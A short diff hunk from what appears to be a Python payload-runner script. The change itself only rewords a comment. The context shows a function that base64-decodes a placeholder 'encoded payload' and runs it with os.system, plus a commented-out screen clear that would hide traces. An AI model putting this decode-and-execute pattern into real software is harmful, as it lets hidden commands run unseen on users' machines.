@@ -8,7 +8,7 @@ xor = b'yourENCODEDpayload'
 def xor_exec():
 	xor_conn = base64.b64decode(xor)
 	os.system(xor_conn.decode('utf-8'))
-	#print('{}'.format(xor_conn))			<<-- uncomment if you want it to be fishy :/
+	#print('{}'.format(xor_conn))			<<-- uncomment if you want it to be spicy :/
 	#os.system('clear')
 	return
 
